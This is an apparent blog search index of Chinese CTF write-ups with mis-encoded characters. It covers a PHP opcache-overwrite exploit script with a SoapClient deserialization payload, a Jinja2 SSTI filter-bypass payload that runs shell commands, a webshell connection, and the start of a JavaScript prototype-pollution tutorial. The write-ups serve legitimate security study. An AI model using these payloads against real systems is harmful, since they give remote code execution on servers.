<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>0psu3åä¸€æœˆæŒ‘æˆ˜èµ›ï½œè¶Šè‰°å·¨Â·è¶Šç‹‚çƒ­]single_phpå¤ç°</title>
      <link href="/2025/01/20/0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%EF%BD%9C%E8%B6%8A%E8%89%B0%E5%B7%A8%C2%B7%E8%B6%8A%E7%8B%82%E7%83%AD-single-php%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/01/20/0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%EF%BD%9C%E8%B6%8A%E8%89%B0%E5%B7%A8%C2%B7%E8%B6%8A%E7%8B%82%E7%83%AD-single-php%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="DASCTF-X-0psu3åä¸€æœˆæŒ‘æˆ˜èµ›ï½œè¶Šè‰°å·¨Â·è¶Šç‹‚çƒ­-single-phpå¤ç°"><a href="#DASCTF-X-0psu3åä¸€æœˆæŒ‘æˆ˜èµ›ï½œè¶Šè‰°å·¨Â·è¶Šç‹‚çƒ­-single-phpå¤ç°" class="headerlink" title="[DASCTF X 0psu3åä¸€æœˆæŒ‘æˆ˜èµ›ï½œè¶Šè‰°å·¨Â·è¶Šç‹‚çƒ­]single_phpå¤ç°"></a>[DASCTF X 0psu3åä¸€æœˆæŒ‘æˆ˜èµ›ï½œè¶Šè‰°å·¨Â·è¶Šç‹‚çƒ­]single_phpå¤ç°</h2><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101718813.png" alt="image-20250110171833140"></p><p>è¿›é¢˜å¦‚ä¸Š</p><p>ä¼ å‚highlight_file,æ‹¿åˆ°æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;style&gt;</span><br><span class="line"> img &#123;</span><br><span class="line"> max-width: 200px;</span><br><span class="line"> max-height: 200px;</span><br><span class="line"> &#125;</span><br><span class="line"> &lt;/style&gt;</span><br><span class="line"> &lt;title&gt;revenge to siranai.php</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> &lt;/title&gt;</span><br><span class="line"> </span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> </span><br><span class="line"> &lt;h5&gt;</span><br><span class="line"> This is my wife.She is from Imagination.</span><br><span class="line"> And I,use her name as my id.</span><br><span class="line"> &lt;/h5&gt;</span><br><span class="line"> &lt;img src=&quot;mywife.png&quot; alt=&quot;this is my wife&quot;&gt;</span><br><span class="line"> &lt;p&gt;I have been single dog for 19 years.&lt;br&gt;</span><br><span class="line"> One day, my brothers betrayed the singles organization.&lt;br&gt;</span><br><span class="line"> S* and B* ,both of them have the kanozyo.&lt;br&gt;</span><br><span class="line"> Now revenge to them!!!!!&lt;br&gt;</span><br><span class="line"> use &#x27;$_GET[&#x27;LuckyE&#x27;](__FILE__);&#x27; to begin your revenge!!&lt;br&gt;</span><br><span class="line"> &lt;/p&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line"> error_reporting(0);</span><br><span class="line"> class siroha&#123;</span><br><span class="line"> public $koi;</span><br><span class="line"> </span><br><span class="line"> public function __destruct()&#123;</span><br><span class="line"> $this-&gt;koi[&#x27;zhanjiangdiyishenqing&#x27;]();</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $kanozyo = $_GET[&#x27;LuckyE&#x27;](__FILE__);</span><br><span class="line"> var_dump($kanozyo);</span><br><span class="line"> $suki = unserialize($_POST[&#x27;suki&#x27;]); </span><br></pre></td></tr></table></figure><p>å¾—åˆ°æç¤ºï¼Œrevenge to siranai.php</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101722996.png" alt="image-20250110172256406"></p><p>emmï¼Œçœ‹èµ·æ¥å¾—æ‰“<a href="https://cloud.tencent.com/developer/article/1878220">Soap</a>ååºåˆ—åŒ–</p><p>å›åˆ°åŸå…ˆçš„ååºåˆ—åŒ–çš„é¡µé¢</p><p>æä¸€ä¸ªphpinfoçœ‹çœ‹</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101729720.png" alt="image-20250110172906287"></p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101738478.png" alt="image-20250110173851522"></p><p>è¿™ä¸ªç¼“å­˜æ˜¯æ”¾åœ¨äº†&#x2F;tmpç›®å½•ä¸‹å¹¶æœ‰æ—¶é—´æˆ³éªŒè¯ï¼Œå¯ä»¥å…ˆäº†è§£<a href="https://xz.aliyun.com/t/223?time__1311=eqIx0DyGG=emqAKqGNSDrDRmhiRRou2bD">opcacheæ‰§è¡Œphpä»£ç </a></p><p>é‚£æ•´ä½“çš„æ€è·¯åº”è¯¥å°±æ˜¯ä¸Šä¼ æˆ‘ä»¬çš„æ¶æ„å‹ç¼©åŒ…ï¼Œå¯¹åŸæœ¬çš„ç¼“å­˜æ–‡ä»¶è¿›è¡Œè¦†ç›–ï¼Œå˜æˆæˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶</p><p>æœ¬åœ°æ‹‰å–ç›¸åŒç‰ˆæœ¬phpçš„é•œåƒï¼Œç”¨è„šæœ¬è¿›è¡Œä¼ªé€ æ—¶é—´æˆ³</p><p>æœ¬äººä»£ç èƒ½åŠ›æœ‰é™ï¼Œç›´æ¥ä½¿ç”¨å®˜æ–¹WPçš„ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">url = <span class="string">&quot;http://97ed25bf-fecf-4710-bd78-9e313a784c29.node5.buuoj.cn:81/?LuckyE=filectime&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timec</span>():</span><br><span class="line">    pattern = <span class="string">r&quot;\d&#123;10&#125;&quot;</span>  <span class="comment">#åŒ¹é…åä½æ•°å­—</span></span><br><span class="line">    timeres = requests.get(url=url)</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&quot;int\((\d&#123;10&#125;)\)&quot;</span>,timeres.text)<span class="comment">#ä»å“åº”åŒ…ä¸­æå–åˆ°æ—¶é—´æˆ³ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ten_digit_number = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(ten_digit_number)</span><br><span class="line">        <span class="keyword">return</span> ten_digit_number  <span class="comment">#è¿”å›æ—¶é—´æˆ³</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;dame&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_string_into_pairs</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(input_string) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦å¿…é¡»æ˜¯å¶æ•°&quot;</span>)</span><br><span class="line">    pairs = [input_string[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(input_string), <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> pairs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">totime</span>(<span class="params">time</span>):</span><br><span class="line">    b = split_string_into_pairs(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">int</span>(time))&#125;</span>&quot;</span>)</span><br><span class="line">    b.pop(<span class="number">0</span>)</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b)):</span><br><span class="line">        s += b[-<span class="number">1</span>]</span><br><span class="line">        b.pop(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changetime</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;index.php.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        binary_data = file.read()</span><br><span class="line">        <span class="comment"># å°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">        hex_data = binascii.hexlify(binary_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        new_data = hex_data[<span class="number">0</span>:<span class="number">128</span>]+totime(timec())+hex_data[<span class="number">136</span>:]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;index.php.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="built_in">bytes</span>.fromhex(new_data))</span><br><span class="line">changetime()</span><br><span class="line">sys_id = hashlib.md5(<span class="string">&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\002&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(sys_id)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tar_file</span>():</span><br><span class="line">    tar_filename = <span class="string">&#x27;exp.tar&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(tar_filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">        directory_info = tarfile.TarInfo(name=<span class="string">f&#x27;<span class="subst">&#123;sys_id&#125;</span>/var/www/html&#x27;</span>)</span><br><span class="line">        directory_info.<span class="built_in">type</span> = tarfile.DIRTYPE</span><br><span class="line">        directory_info.mode = <span class="number">0o777</span></span><br><span class="line">        tar.addfile(directory_info)</span><br><span class="line">        tar.add(<span class="string">&#x27;index.php.bin&#x27;</span>, arcname=<span class="string">f&#x27;<span class="subst">&#123;sys_id&#125;</span>/var/www/html/index.php.bin&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;exp.tar&quot;</span>,<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>,<span class="string">&quot;rb&quot;</span>).read(),<span class="string">&quot;application/x-tar&quot;</span>)&#125;</span><br><span class="line">    res  = requests.post(url=<span class="string">&quot;http://97ed25bf-fecf-4710-bd78-9e313a784c29.node5.buuoj.cn:81/siranai.php&quot;</span>,files=file)</span><br><span class="line">    <span class="built_in">print</span>(res.request.headers)</span><br><span class="line">    <span class="keyword">return</span> res.request</span><br><span class="line">tar_file()</span><br><span class="line">request_content = upload()</span><br><span class="line">upload_body = <span class="built_in">str</span>(request_content.body).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)</span><br><span class="line">content_length = request_content.headers[<span class="string">&#x27;Content-Length&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(content_length)</span><br><span class="line"><span class="built_in">print</span>(upload_body)</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101747887.png" alt="image-20250110174712860"></p><p>å°è£…åˆ°Soap</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">siroha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$koi</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$postdata</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/siranai.php&quot;</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;Enterpr1se\r\n&quot;</span> . <span class="string">&quot;Cookie: PHPSESSION=16aaab9fb\r\nContent-Type: multipart/form-data; boundary=&quot;</span> . <span class="title function_ invoke__">substr</span>(<span class="variable">$postdata</span>, <span class="number">2</span>, <span class="number">32</span>) . <span class="string">&quot;\r\nConnection: keep-alive\r\nAccept: */*\r\nContent-Length: 10416&quot;</span> . <span class="string">&quot;\r\n\r\n&quot;</span> . <span class="variable">$postdata</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/siranai.php&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (SoapFault <span class="variable">$e</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">siroha</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;koi = [<span class="string">&quot;zhanjiangdiyishenqing&quot;</span> =&gt; [<span class="variable">$a</span>, <span class="string">&quot;nnnnn&quot;</span>]];</span><br><span class="line"><span class="comment">//é€šè¿‡æ•°ç»„è°ƒç”¨ç±»æ–¹æ³•è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•è§¦å‘::__callé­”æœ¯æ–¹æ³•</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><p>BPæ”¾åŒ…</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101746573.png" alt="image-20250110174642997"></p><p>è¿™å°±å·²ç»è¦†ç›–æˆåŠŸäº†ï¼Œç›´æ¥ä¼ å‚æ‹¿åˆ°flag</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101750618.png" alt="image-20250110175053635"></p><p><del>è¿™é¢˜ç¡®å®ä¸å¥½å†™ï¼Œæ®è¯´å½“æ—¶æ˜¯é›¶è§£ï¼Œæˆ‘ç°åœ¨å†™éƒ½ä¸å¥½å†™ã€å¤§å“­ã€‘</del></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn-ccbéƒ¨åˆ†WP</title>
      <link href="/2024/12/15/ciscn-ccb%E9%83%A8%E5%88%86WP/"/>
      <url>/2024/12/15/ciscn-ccb%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<h1 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h1><p>å¼€å±€æºç ï¼Œè²Œä¼¼ä¸èƒ½ç›´æ¥æ</p><p>æ‹‰åˆ°æœ¬åœ°ç›´æ¥æ¢­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>+html.escape(f.read())+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    template_code = request.form.get(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">    <span class="comment"># å®‰å…¨è¿‡æ»¤</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> template_code:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Forbidden content detected!&quot;</span></span><br><span class="line">    result = render_template_string(template_code)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151847862.png"></p><p>æ‹¿payloadç›´æ¥æ‰“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;%set gl=&#x27;_&#x27;*2+&#x27;globals&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set bu=&#x27;_&#x27;*2+&#x27;builtins&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set im=&#x27;_&#x27;*2+&#x27;i&#x27;&#x27;mport&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set rr=&#x27;so&#x27;[::-1]%&#125;&#123;&#123;cycler.next[gl][bu][im](rr)[&#x27;p&#x27;&#x27;open&#x27;](&#x27;echo `ls /` &gt; app.py&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151848872.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;%set gl=&#x27;_&#x27;*2+&#x27;globals&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set bu=&#x27;_&#x27;*2+&#x27;builtins&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set im=&#x27;_&#x27;*2+&#x27;i&#x27;&#x27;mport&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set rr=&#x27;so&#x27;[::-1]%&#125;&#123;&#123;cycler.next[gl][bu][im](rr)[&#x27;p&#x27;&#x27;open&#x27;](&#x27;echo `cat /flag` &gt; app.py&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151849782.png"></p><h1 id="hello-web"><a href="#hello-web" class="headerlink" title="hello web"></a>hello web</h1><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151903324.png"></p><p>çœ‹æ³¨é‡Šçœ‹åˆ°äº†ä¸€ä¸ªè¿™ä¸ªæç¤º</p><p>è®¿é—®åå‘ç°ï¼Œå¾—â€¦.&#x2F;&#x2F;ç»•è¿‡</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151911177.png"></p><p>è¿™ä¹ˆä¸ªäº‹å„¿</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151911700.png" alt="image-20241215191139648"></p><p>å®ƒæ˜¯ä¸ªğŸå•Š</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412152028604.png" alt="image-20241215202829273"></p><p>èšå‰‘è¿æ¥åœ¨&#x2F;run&#x2F;log&#x2F;è¿™ä¸ªé‡Œé¢çš„å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­æœ‰flag</p><p><del>sxweb1æ˜æ˜æŒ‰é“ç†åº”è¯¥å‡ºçš„ï¼Œâ„¢çš„ä¸€ç›´æŠ¥500â€¦â€¦.5555555â€¦è¿˜æ˜¯èœã€‚ã€‚ã€‚</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> -web -ciscn&amp;ccb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSåŸå‹é“¾æ±¡æŸ“</title>
      <link href="/2024/12/13/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2024/12/13/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="JSåŸå‹é“¾æ±¡æŸ“"><a href="#JSåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="JSåŸå‹é“¾æ±¡æŸ“"></a>JSåŸå‹é“¾æ±¡æŸ“</h1><p>nodejså’Œjavascriptè¯­æ³•å’Œæ ‡å‡†æœ‰äº›ä¸åŒï¼Œåº”ç”¨åœºæ™¯ä¸ä¸€æ ·ï¼Œä½†æ˜¯åœ¨åŸå‹é“¾æ±¡æŸ“è¿™æ–¹é¢å¯ä»¥äº’é€šã€‚</p><h3 id="JSåˆ›å»ºå¯¹è±¡çš„ä¸‰ç§æ–¹æ³•"><a href="#JSåˆ›å»ºå¯¹è±¡çš„ä¸‰ç§æ–¹æ³•" class="headerlink" title="JSåˆ›å»ºå¯¹è±¡çš„ä¸‰ç§æ–¹æ³•"></a>JSåˆ›å»ºå¯¹è±¡çš„ä¸‰ç§æ–¹æ³•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">jsåˆ›å»ºå¯¹è±¡çš„ä¸‰ç§æ–¹æ³• ï¼š</span><br><span class="line"></span><br><span class="line">æ™®é€šåˆ›å»º</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person=&#123;<span class="attr">name</span>:<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;19&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person=&#123;&#125;  <span class="comment">//åˆ›å»ºç©ºå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">æ„é€ å‡½æ•°æ–¹æ³•åˆ›å»º</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">person</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span>=<span class="string">&quot;liahuqiu&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">test</span>=<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">person.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">a</span>=<span class="number">3</span>;</span><br><span class="line">web=<span class="keyword">new</span> <span class="title 